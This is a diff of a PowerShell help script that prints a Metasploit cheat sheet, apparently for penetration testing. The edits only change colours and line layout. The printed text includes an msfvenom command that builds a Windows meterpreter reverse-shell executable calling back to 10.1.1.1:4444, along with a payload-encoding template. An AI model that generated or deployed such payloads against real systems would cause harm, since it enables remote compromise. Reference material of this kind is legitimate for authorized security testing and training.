@@ -709,7 +709,7 @@ function Msf-Help
 {
     whdarkYellow ""
     whred        "METASPLOIT "
-    whred        " https://www.offensive-security.com/metasploit-unleashed/introduction/ "
+    whyellow     " https://www.offensive-security.com/metasploit-unleashed/introduction/ "
     whred        "Useful Auxiliary Modules "
     whyellow     "Port Scanner: "
     whdarkYellow " - use auxiliary/scanner/portscan/tcp "
@@ -799,12 +799,13 @@ function Msf-Help
     whyellow     "Example: "
     whdarkYellow " - msfvenom -p windows/meterpreter/ reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe   "
     whyellow     "Format Options (specified with –f) "
-    whdarkYellow " - --help-formats  = help commands "
-    whdarkYellow " exe – Executable `
-                   pl – Perl `
-                   rb – Ruby `
-                   raw – Raw shellcode `
-                   c – C code "
+    whyellow     "Format Options (specified with –f) "
+    whdarkYellow " --help-formats  = help commands "
+    whdarkYellow " exe – Executable"
+    whdarkYellow " pl  – Perl"
+    whdarkYellow " rb  – Ruby"
+    whdarkYellow " raw – Raw shellcode"
+    whdarkYellow " c   – C code "
     whyellow     "Encoding Payloads with msfvenom "
     whdarkYellow " - msfvenom -l encoders   = show encoders "
     whdarkYellow " - msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeInterations] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort] "
